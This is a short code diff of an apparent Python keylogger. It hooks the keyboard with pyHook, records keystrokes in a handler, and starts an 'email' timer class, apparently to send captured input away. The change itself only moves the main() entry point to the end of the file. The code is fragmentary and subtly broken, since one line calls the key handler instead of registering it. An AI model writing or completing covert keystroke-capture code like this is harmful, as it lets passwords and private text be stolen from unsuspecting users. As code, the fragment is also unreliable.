@@ -69,9 +69,6 @@ def main():
 	email=TimerClass()
 	email.start()
 
-if __name__ == '__main__':
-    main()
-
 def keypressed(event):
     global x,data
     if event.Ascii==13:
@@ -89,3 +86,6 @@ obj = pyHook.HookManager()
 obj.KeyDown = keypressed()
 obj.HookKeyboard()
 pythoncom.PumpMessages()
+
+if __name__ == '__main__':
+    main()
